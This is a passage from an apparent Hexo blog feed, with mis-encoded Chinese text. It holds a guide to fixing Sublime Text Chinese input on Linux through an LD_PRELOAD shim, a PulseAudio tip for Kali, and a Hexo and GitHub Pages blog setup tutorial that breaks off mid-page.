title="è§£å†³sublimeçš„ä¸­æ–‡è¾“å…¥é—®é¢˜"></a>è§£å†³sublimeçš„ä¸­æ–‡è¾“å…¥é—®é¢˜</h4><ol><li>ä¿å­˜ä¸‹è¿°ä»£ç ä¸º <code>sublime-imfix.c</code> æ–‡ä»¶</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">sublime-imfix.c</span><br><span class="line">Use LD_PRELOAD to interpose some function to fix sublime input method support for linux.</span><br><span class="line">By Cjacker Huang</span><br><span class="line"></span><br><span class="line">gcc -shared -o libsublime-imfix.so sublime-imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC</span><br><span class="line">LD_PRELOAD=./libsublime-imfix.so subl</span><br><span class="line">*/</span><br><span class="line">#include &lt;gtk/gtk.h&gt;</span><br><span class="line">#include &lt;gdk/gdkx.h&gt;</span><br><span class="line">typedef GdkSegment GdkRegionBox;</span><br><span class="line"></span><br><span class="line">struct _GdkRegion</span><br><span class="line">&#123;</span><br><span class="line">  long size;</span><br><span class="line">  long numRects;</span><br><span class="line">  GdkRegionBox *rects;</span><br><span class="line">  GdkRegionBox extents;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">GtkIMContext *local_context;</span><br><span class="line"></span><br><span class="line">void</span><br><span class="line">gdk_region_get_clipbox (const GdkRegion *region,</span><br><span class="line">            GdkRectangle    *rectangle)</span><br><span class="line">&#123;</span><br><span class="line">  g_return_if_fail (region != NULL);</span><br><span class="line">  g_return_if_fail (rectangle != NULL);</span><br><span class="line"></span><br><span class="line">  rectangle-&gt;x = region-&gt;extents.x1;</span><br><span class="line">  rectangle-&gt;y = region-&gt;extents.y1;</span><br><span class="line">  rectangle-&gt;width = region-&gt;extents.x2 - region-&gt;extents.x1;</span><br><span class="line">  rectangle-&gt;height = region-&gt;extents.y2 - region-&gt;extents.y1;</span><br><span class="line">  GdkRectangle rect;</span><br><span class="line">  rect.x = rectangle-&gt;x;</span><br><span class="line">  rect.y = rectangle-&gt;y;</span><br><span class="line">  rect.width = 0;</span><br><span class="line">  rect.height = rectangle-&gt;height;</span><br><span class="line">  //The caret width is 2;</span><br><span class="line">  //Maybe sometimes we will make a mistake, but for most of the time, it should be the caret.</span><br><span class="line">  if(rectangle-&gt;width == 2 &amp;&amp; GTK_IS_IM_CONTEXT(local_context)) &#123;</span><br><span class="line">        gtk_im_context_set_cursor_location(local_context, rectangle);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//this is needed, for example, if you input something in file dialog and return back the edit area</span><br><span class="line">//context will lost, so here we set it again.</span><br><span class="line"></span><br><span class="line">static GdkFilterReturn event_filter (GdkXEvent *xevent, GdkEvent *event, gpointer im_context)</span><br><span class="line">&#123;</span><br><span class="line">    XEvent *xev = (XEvent *)xevent;</span><br><span class="line">    if(xev-&gt;type == KeyRelease &amp;&amp; GTK_IS_IM_CONTEXT(im_context)) &#123;</span><br><span class="line">       GdkWindow * win = g_object_get_data(G_OBJECT(im_context),&quot;window&quot;);</span><br><span class="line">       if(GDK_IS_WINDOW(win))</span><br><span class="line">         gtk_im_context_set_client_window(im_context, win);</span><br><span class="line">    &#125;</span><br><span class="line">    return GDK_FILTER_CONTINUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void gtk_im_context_set_client_window (GtkIMContext *context,</span><br><span class="line">          GdkWindow    *window)</span><br><span class="line">&#123;</span><br><span class="line">  GtkIMContextClass *klass;</span><br><span class="line">  g_return_if_fail (GTK_IS_IM_CONTEXT (context));</span><br><span class="line">  klass = GTK_IM_CONTEXT_GET_CLASS (context);</span><br><span class="line">  if (klass-&gt;set_client_window)</span><br><span class="line">    klass-&gt;set_client_window (context, window);</span><br><span class="line"></span><br><span class="line">  if(!GDK_IS_WINDOW (window))</span><br><span class="line">    return;</span><br><span class="line">  g_object_set_data(G_OBJECT(context),&quot;window&quot;,window);</span><br><span class="line">  int width = gdk_window_get_width(window);</span><br><span class="line">  int height = gdk_window_get_height(window);</span><br><span class="line">  if(width != 0 &amp;&amp; height !=0) &#123;</span><br><span class="line">    gtk_im_context_focus_in(context);</span><br><span class="line">    local_context = context;</span><br><span class="line">  &#125;</span><br><span class="line">  gdk_window_add_filter (window, event_filter, context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>å®‰è£… C/C++ çš„ç¼–è¯‘ç¯å¢ƒå’Œ gtk libgtk2.0-dev</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential</span><br><span class="line">sudo apt-get install libgtk2.0-dev</span><br></pre></td></tr></table></figure><ol start="3"><li>ç¼–è¯‘å…±äº«å†…åº“</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o libsublime-imfix.so sublime-imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC</span><br></pre></td></tr></table></figure><ol start="4"><li>è®¾ç½® LD_PRELOAD å¹¶å¯åŠ¨ Sublime Text</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=./libsublime-imfix.so subl</span><br></pre></td></tr></table></figure><ol start="5"><li>ä¿®æ”¹ <code>/usr/share/applications/sublime_text.desktop</code> ä¸º</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">[...]</span><br><span class="line">Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text %F</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">[Desktop Action Window]</span><br><span class="line">[...]</span><br><span class="line">Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text -n</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">[Desktop Action Document]</span><br><span class="line">[...]</span><br><span class="line">Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text --command new_file</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>ä¸è¦å¿˜äº†æŠŠ <code>libsublime-imfix.so</code> æ”¾åˆ° <code>/opt/sublime_text/</code> ä¸­</p><ol start="6"><li>ä¿®æ”¹ <code>/usr/bin/subl</code> ä¸º:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">export LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so</span><br><span class="line">exec /opt/sublime_text/sublime_text â€œ$@â€</span><br></pre></td></tr></table></figure><p>é‡å¯ç”µè„‘ï¼Œå¯ä»¥çœ‹åˆ°Sublimeèƒ½å¤Ÿè¾“å…¥ä¸­æ–‡äº†ã€‚</p><h4 id="æ²¡æœ‰å£°éŸ³"><a href="#æ²¡æœ‰å£°éŸ³" class="headerlink" title="æ²¡æœ‰å£°éŸ³???"></a>æ²¡æœ‰å£°éŸ³???</h4><p>å…¶å®å¹¶ä¸æ˜¯ä¸æ”¯æŒå£°å¡é©±åŠ¨äº†ã€‚<br>åªæ˜¯rootç”¨æˆ·ä¸‹é»˜è®¤å…³é—­ã€‚<br>è™½ç„¶åœ¨settingçš„soundsé‡Œæ²¡èƒ½çœ‹åˆ°è¯†åˆ«çš„å£°å¡ä¿¡æ¯ã€‚å¯æ˜¯å…¶å®é©±åŠ¨æ˜¯è£…å¥½çš„ã€‚<br>ç”¨<code>pulseaudio â€“start</code>ï¼Œå°±æœ‰äº†ã€‚</p><p>è¾“å…¥ä»¥ä¸‹ä¸€è¡Œï¼Œå°±ä¸ç”¨æ¯æ¬¡å¯åŠ¨éƒ½è¦è¾“å…¥é‚£è¡Œä»£ç äº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl â€“user enable pulseaudio</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h4&gt;&lt;p&gt;Kali Linuxå®˜æ–¹äº8æœˆ30æ—¥å‘å¸ƒKali Linux 2016çš„ç¬¬äºŒä¸ªç‰ˆæœ¬Kali Linux 2016.2ã€‚è¯¥ç‰ˆæœ¬è·ç¦»Kali L
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hexo 3.x åšå®¢æ­å»ºæŒ‡å—(NEXTä¸»é¢˜)</title>
    <link href="http://zer0yu.github.io/2017/01/21/Hexo-3-x-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97-NEXT%E4%B8%BB%E9%A2%98/"/>
    <id>http://zer0yu.github.io/2017/01/21/Hexo-3-x-åšå®¢æ­å»ºæŒ‡å—-NEXTä¸»é¢˜/</id>
    <published>2017-01-21T13:43:00.000Z</published>
    <updated>2017-01-22T10:44:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>GitHub Pages æœ¬ç”¨äºä»‹ç»æ‰˜ç®¡åœ¨ GitHub çš„é¡¹ç›®ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥æ­å»ºåšå®¢ï¼Œæœ‰300Må…è´¹ç©ºé—´ã€‚</p><p>hexoæ˜¯ä¸€ä¸ªåŸºäºNode.jsçš„é™æ€åšå®¢ç¨‹åºï¼Œå¯ä»¥æ–¹ä¾¿çš„ç”Ÿæˆé™æ€ç½‘é¡µæ‰˜ç®¡åœ¨githubå’ŒHerokuä¸Šã€‚ä½œè€…æ˜¯æ¥è‡ªå°æ¹¾çš„<a href="https://github.com/hexojs/hexo" target="_blank" rel="noopener">tommy351</a>ã€‚<br>ä¼˜åŠ¿ï¼š</p><blockquote><p>ç”Ÿæˆé™æ€é¡µé¢å¿«<br>æ”¯æŒ Markdown<br>å…¼å®¹äº Windows, Mac &amp; Linux<br>éƒ¨ç½²æ–¹ä¾¿ã€‚æ—¥å¸¸ä½¿ç”¨ä»…éœ€äº”ä¸ªå‘½ä»¤ã€‚<br>é«˜æ‰©å±•æ€§ã€è‡ªè®¢æ€§ï¼Œæ–‡ä»¶å°‘ã€å°ï¼Œæ˜“ç†è§£</p></blockquote><h4 id="é…ç½®SSH"><a href="#é…ç½®SSH" class="headerlink" title="é…ç½®SSH"></a>é…ç½®SSH</h4><p>ä½¿ç”¨hexoåšå®¢å¿…é¡»é…ç½®SSHã€‚</p><p>æ‰“å¼€git bashï¼Œè¾“å…¥<code>cd ~/.ssh</code>ï¼Œå¦‚æœæœæç¤ºï¼šNo such file or directory è¯´æ˜æœªé…ç½®SSHã€‚</p><ul><li><strong>æœ¬åœ°ç”Ÿæˆå¯†é’¥å¯¹</strong><br><code>ssh-keygen -t rsa -C &quot;ä½ çš„é‚®ä»¶åœ°å€&quot;</code>ï¼Œæ³¨æ„å‘½ä»¤ä¸­çš„å¤§å°å†™ä¸è¦ææ··ã€‚æŒ‰æç¤ºæŒ‡å®šä¿å­˜æ–‡ä»¶å¤¹ï¼Œä¸è®¾ç½®å¯†ç ã€‚</li><li><strong>æ·»åŠ å…¬é’¥åˆ°Github</strong></li></ul><ol><li>æ ¹æ®ä¸Šä¸€æ­¥çš„æç¤ºï¼Œæ‰¾åˆ°å…¬é’¥æ–‡ä»¶ï¼ˆé»˜è®¤ä¸ºid_rsa.pubï¼‰ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œå…¨é€‰å¹¶å¤åˆ¶ã€‚</li><li>ç™»å½•Githubï¼Œå³ä¸Šè§’ å¤´åƒ -&gt; <code>Settings</code> â€”&gt; <code>SSH keys</code> â€”&gt; <code>Add SSH</code> keyã€‚æŠŠå…¬é’¥ç²˜è´´åˆ°keyä¸­ï¼Œå¡«å¥½titleå¹¶ç‚¹å‡» Add keyã€‚</li><li>git bashä¸­è¾“å…¥å‘½ä»¤<code>ssh -T git@github.com</code>ï¼Œé€‰yesï¼Œç­‰å¾…ç‰‡åˆ»å¯çœ‹åˆ°æˆåŠŸæç¤ºã€‚</li></ol><ul><li><strong>ä¿®æ”¹æœ¬åœ°çš„ssh remote urlï¼Œä¸ç”¨httpsåè®®ï¼Œæ”¹ç”¨gitåè®®</strong></li></ul><ol><li>Githubä»“åº“ä¸­è·å–sshåè®®ç›¸åº”çš„url</li><li>æœ¬åœ°ä»“åº“æ‰§è¡Œå‘½ä»¤<code>git remote set-url origin SSHå¯¹åº”çš„url</code>ï¼Œé…ç½®å®Œåå¯ç”¨<code>git remote -v</code>æŸ¥çœ‹ç»“æœ</li></ol><p>è¿™æ ·<code>git push</code>æˆ–<code>hexo d</code>æ—¶ä¸å†éœ€è¦è¾“å…¥è´¦å·å¯†ç ã€‚</p><h4 id="æ­å»ºåšå®¢"><a href="#æ­å»ºåšå®¢" class="headerlink" title="æ­å»ºåšå®¢"></a>æ­å»ºåšå®¢</h4><p>æ³¨ï¼Œä»¥ä¸‹å‘½ä»¤è¡Œéœ€è¦åœ¨Gitç»ˆç«¯ä¸­æ‰§è¡Œ(å³é”®å•å‡» -&gt; <code>Git bash</code>)ã€‚</p><ul><li>å®‰è£…<a href="http://git-scm.com/" target="_blank" rel="noopener">Git</a>ï¼šä¸‹è½½å®‰è£…åï¼Œæ³¨å†ŒGithubè´¦å·å¹¶é…ç½®Gitå’ŒSSHå…¬ç§é’¥</li><li>å®‰è£…<a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a></li><li>å®‰è£…hexoï¼š<code>npm install -g hexo</code>ï¼Œå¯ç”¨<code>hexo -v</code>æŸ¥çœ‹ç‰ˆæœ¬ã€‚è¿™é‡Œæˆ‘ç”¨çš„æ˜¯<strong>3.1.1</strong>ã€‚ä¹Ÿå¯ä»¥æŒ‡å®šç‰ˆæœ¬ï¼š<code>npm install hexo@3.1.1 -g</code></li><li>åˆ›å»ºhexoæ–‡ä»¶å¤¹ï¼šæ–°å»ºæ”¾ç½®åšå®¢çš„æ–‡ä»¶å¤¹ï¼Œè¿›å…¥å¹¶æ‰§è¡Œå‘½ä»¤<code>hexo init</code>ã€‚hexo ä¼šåœ¨ç›®æ ‡æ–‡ä»¶å¤¹å»ºç«‹ç½‘ç«™æ‰€éœ€è¦çš„æ‰€æœ‰æ–‡ä»¶ã€‚</li><li>å®‰è£…ä¾èµ–åŒ…ï¼š<code>npm install</code></li><li>åˆ›å»ºGithub Repositoryï¼šRepositoryåå­—å¿…é¡»æ˜¯<code>ä½ çš„Githubå.github.io</code>ï¼Œæ¯”å¦‚æˆ‘æ˜¯<code>loveNight.github.io</code></li><li>éƒ¨ç½²ï¼šæ‰“å¼€åšå®¢æ ¹ç›®å½•ä¸‹çš„<code>_config.yml</code>æ–‡ä»¶ï¼Œæœ«å°¾æ·»åŠ å¦‚ä¸‹ä¿¡æ¯ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repository: ä¸Šä¸€æ­¥çš„Githubä»“åº“åœ°å€ï¼Œé¡¹ç›®ä¸»é¡µç‚¹SSHå†å¤åˆ¶URL</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo generate <span class="comment"># ç”Ÿæˆé™æ€é¡µé¢ï¼Œå¯ä»¥ç®€åŒ–ä¸ºhexo g</span></span><br><span class="line">hexo deploy <span class="comment"># éƒ¨ç½²åˆ°Githubï¼Œå¯ä»¥ç®€åŒ–ä¸ºhexo d</span></span><br></pre></td></tr></table></figure><p>æµè§ˆå™¨è®¿é—®<code>loveNight.github.io</code>å°±èƒ½çœ‹åˆ°è‡ªå·±çš„Blogäº†ï¼Œä¸€èˆ¬å»¶è¿Ÿååˆ†é’Ÿå·¦å³æ‰èƒ½çœ‹åˆ°æ•ˆæœã€‚ä¸€å¼€å§‹çœ‹åˆ°404é¡µé¢ä¸è¦æƒŠæ…Œï¼Œè€å¿ƒç­‰ç­‰ã€‚</p><p>æ‰‹æ‰“å…šè¯·æ³¨æ„ï¼Œé…ç½®æ–‡ä»¶çš„å†’å·åå¿…é¡»æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚</p><p>å¦‚æœæŠ¥é”™</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Deployer not found:git</span><br></pre></td></tr></table></figure><p>è¿è¡Œå‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h4 id="hexoä½¿ç”¨"><a href="#hexoä½¿ç”¨" class="headerlink" title="hexoä½¿ç”¨"></a>hexoä½¿ç”¨</h4><h5 id="ç”Ÿæˆé™æ€é¡µé¢"><a href="#ç”Ÿæˆé™æ€é¡µé¢" class="headerlink" title="ç”Ÿæˆé™æ€é¡µé¢"></a>ç”Ÿæˆé™æ€é¡µé¢</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate</span><br></pre></td></tr></table></figure><h5 id="æœ¬åœ°å¯åŠ¨"><a href="#æœ¬åœ°å¯åŠ¨" class="headerlink" title="æœ¬åœ°å¯åŠ¨"></a>æœ¬åœ°å¯åŠ¨</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>æµè§ˆå™¨è¾“å…¥<code>localhost:4000</code>å°±å¯ä»¥çœ‹åˆ°æ•ˆæœã€‚å½“ä½ ä¿®æ”¹äº†æ–‡ç« æˆ–é…ç½®æ–‡ä»¶æ—¶ï¼Œä¿å­˜æ–‡ä»¶å†åˆ·æ–°æµè§ˆå™¨å°±èƒ½çœ‹åˆ°ä¿®æ”¹åçš„æ•ˆæœï¼Œéå¸¸æ–¹ä¾¿ã€‚</p><h5 id="æ–°å»ºæ–‡ç« "><a href="#æ–°å»ºæ–‡ç« " class="headerlink" title="æ–°å»ºæ–‡ç« "></a>æ–°å»ºæ–‡ç« </h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new post &quot;title&quot;  # ç”Ÿæˆæ–°æ–‡ç« ï¼š\source\_posts\title.mdï¼Œå¯çœç•¥post</span><br></pre></td></tr></table></figure><h5 id="æ–°å»ºé¡µé¢"><a href="#æ–°å»ºé¡µé¢" class="headerlink" title="æ–°å»ºé¡µé¢"></a>æ–°å»ºé¡µé¢</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &quot;title&quot;</span><br></pre></td></tr></table></figure><p>postã€pageç­‰å¯ä»¥æ”¹æˆå…¶ä»–layoutï¼Œå¯ç”¨layoutåœ¨scaffoldsç›®å½•ä¸‹æŸ¥çœ‹ã€‚åœ¨åŒç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶æ¥æ·»åŠ è‡ªå·±çš„layoutï¼Œä¹Ÿå¯ä»¥ç¼–è¾‘ç°æœ‰çš„layoutï¼Œæ¯”å¦‚postçš„layouté»˜è®¤æ˜¯<code>\scaffolds\post.md</code>ã€‚</p><h5 id="ç¼–è¾‘æ–‡ç« "><a href="#ç¼–è¾‘æ–‡ç« " class="headerlink" title="ç¼–è¾‘æ–‡ç« "></a>ç¼–è¾‘æ–‡ç« </h5><p>æ‰“å¼€æ–°å»ºçš„æ–‡ç« <code>\source\_posts\postName.md</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">title: HelloWorldï¼ # æ–‡ç« é¡µé¢ä¸Šçš„æ˜¾ç¤ºåç§°ï¼Œå¯ä»¥ä»»æ„ä¿®æ”¹ï¼Œä¸ä¼šå‡ºç°åœ¨URLä¸­</span><br><span class="line">date: 2015-11-09 15:56:26 # æ–‡ç« ç”Ÿæˆæ—¶é—´ï¼Œä¸€èˆ¬ä¸æ”¹</span><br><span class="line">categories:   # æ–‡ç« åˆ†ç±»ç›®å½•ï¼Œå‚æ•°å¯çœç•¥</span><br><span class="line">    - éšç¬”</span><br><span class="line">    - ç¬é—´</span><br><span class="line">tags:   # æ–‡ç« æ ‡ç­¾ï¼Œå‚æ•°å¯çœç•¥</span><br><span class="line">    - hexo</span><br><span class="line">    - blog # ä¸ªæ•°ä¸é™ï¼Œå•ä¸ªå¯ç›´æ¥è·Ÿåœ¨tagsåé¢</span><br><span class="line">---</span><br><span class="line">è¿™é‡Œå¼€å§‹ä½¿ç”¨markdownæ ¼å¼è¾“å…¥ä½ çš„æ­£æ–‡ã€‚</span><br></pre></td></tr></table></figure><p>å¤šçº§åˆ†ç±»è¯­æ³•æ ¼å¼ï¼šï¼ˆæ ‡ç­¾ä¹Ÿå¯ä»¥ç”¨ç±»ä¼¼çš„å†™æ³•ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># ç¬¬ä¸€ç§</span><br><span class="line">categories:</span><br><span class="line">  - ä¸€çº§åˆ†ç±»</span><br><span class="line">  - äºŒçº§åˆ†ç±»</span><br><span class="line">  - etc...</span><br><span class="line"></span><br><span class="line"># ç¬¬äºŒç§ï¼š</span><br><span class="line">categories: [ä¸€çº§åˆ†ç±», äºŒçº§åˆ†ç±»]</span><br></pre></td></tr></table></figure><p>é¦–é¡µæ–‡ç« é¢„è§ˆæ·»åŠ å›¾ç‰‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">photos:</span><br><span class="line">  - http://xxx.com/photo1.jpg</span><br><span class="line">  - http://xxx.com/photo2.jpg</span><br></pre></td></tr></table></figure><p>æ­£æ–‡ä¸­å¯ä»¥ä½¿ç”¨<code></code>è®¾ç½®æ–‡ç« æ‘˜è¦ å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä»¥ä¸Šæ˜¾ç¤ºåœ¨æ‘˜è¦ä¸­</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line">ä»¥ä¸‹æ˜¯ä½™ä¸‹å…¨æ–‡</span><br></pre></td></tr></table></figure><p>more ä»¥ä¸Šå†…å®¹å³æ˜¯æ–‡ç« æ‘˜è¦ï¼Œå¦‚æœè®¾ç½®äº†ä¸»é¡µåªæ˜¾ç¤ºæ‘˜è¦ï¼Œåˆ™moreä»¥ä¸‹å†…å®¹ç‚¹å‡» <code>Read More</code> é“¾æ¥æ‰“å¼€å…¨æ–‡æ‰æ˜¾ç¤ºã€‚</p><h5 id="ç®€å•å‘½ä»¤"><a href="#ç®€å•å‘½ä»¤" class="headerlink" title="ç®€å•å‘½ä»¤"></a>ç®€å•å‘½ä»¤</h5><p>hexoç°åœ¨æ”¯æŒæ›´åŠ ç®€å•çš„å‘½ä»¤æ ¼å¼äº†ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo g == hexo generate # ç”Ÿæˆ</span><br><span class="line">hexo d == hexo deploy # éƒ¨ç½² # å¯ä¸hexo gåˆå¹¶ä¸º hexo d -g</span><br><span class="line">hexo s == hexo server # æœ¬åœ°é¢„è§ˆ</span><br><span class="line">hexo n == hexo new # å†™æ–‡ç« </span><br></pre></td></tr></table></figure><h5 id="æ’å…¥å›¾ç‰‡"><a href="#æ’å…¥å›¾ç‰‡" class="headerlink" title="æ’å…¥å›¾ç‰‡"></a>æ’å…¥å›¾ç‰‡</h5><p>åšå®¢ä¸­çš„å›¾ç‰‡æ–‡ä»¶å¯ä»¥ç›´æ¥æ”¾åœ¨sourceæ–‡ä»¶å¤¹ä¸‹ï¼Œéƒ¨ç½²æ—¶ä¸Šä¼ åˆ°Githubä»“åº“ä¸­ã€‚ä½†æ˜¯Githubé¡¹ç›®å®¹é‡æœ‰é™ï¼Œè€Œä¸”ä¸»æœºåœ¨å›½å¤–ï¼Œè®¿é—®é€Ÿåº¦è¾ƒæ…¢ï¼ŒæŠŠå›¾ç‰‡æ”¾åœ¨å›½å†…çš„å›¾åºŠä¸Šæ˜¯ä¸ªæ›´å¥½çš„é€‰æ‹©ã€‚æˆ‘ç”¨çš„æ˜¯<a href="https://portal.qiniu.com/signup?code=3lgo2c4fgwv9u" target="_blank" rel="noopener">ä¸ƒç‰›äº‘å­˜å‚¨</a></p><p>å…è´¹ç”¨æˆ·å®åå®¡æ ¸ä¹‹åï¼Œå¯ä»¥è·å–10GBæ°¸ä¹…å…è´¹å­˜å‚¨ç©ºé—´ã€æ¯æœˆ10GBä¸‹è½½æµé‡ã€æ¯æœˆ10ä¸‡æ¬¡Putè¯·æ±‚ã€æ¯æœˆ100ä¸‡æ¬¡Getè¯·æ±‚ï¼Œåšå›¾åºŠç»°ç»°æœ‰ä½™ã€‚</p><p>æ³¨å†Œè´¦å·ï¼Œæ–°å»ºç©ºé—´ï¼Œæˆ‘çš„æ–°ç©ºé—´åæ˜¯<code>blog</code>ï¼Œä¸“é—¨ç”¨æ¥æ”¾ç½®åšå®¢ä¸Šå¼•ç”¨çš„èµ„æºã€‚</p><p>è¿›å…¥ç©ºé—´åç‚¹å‡»ã€Œå†…å®¹ç®¡ç†ã€ï¼Œå†ç‚¹å‡»ã€Œä¸Šä¼ ã€ï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/hexo-1.png" alt="1"></p><p>ä¸ƒç‰›ç©ºé—´æ²¡æœ‰æ–‡ä»¶å¤¹çš„æ¦‚å¿µï¼Œä½†æ˜¯å…è®¸ä¸ºæ–‡ä»¶æ·»åŠ å¸¦æ–œæ <code>/</code>çš„å‰ç¼€ï¼Œç”¨æ¥ç»™èµ„æºåˆ†ç±»ã€‚è¿™é‡Œæˆ‘è®¾ç½®å‰ç¼€ä¸º<code>img/Hexo 3.1.1 é™æ€åšå®¢æ­å»ºæŒ‡å—/</code>ã€‚ä¸Šä¼ äº†ä¸€å¼ å›¾ç‰‡,åœ¨å³ä¾§å¯ä»¥æ‰¾åˆ°å¤–é“¾ï¼Œå¤åˆ¶åœ°å€ï¼š</p><p><img 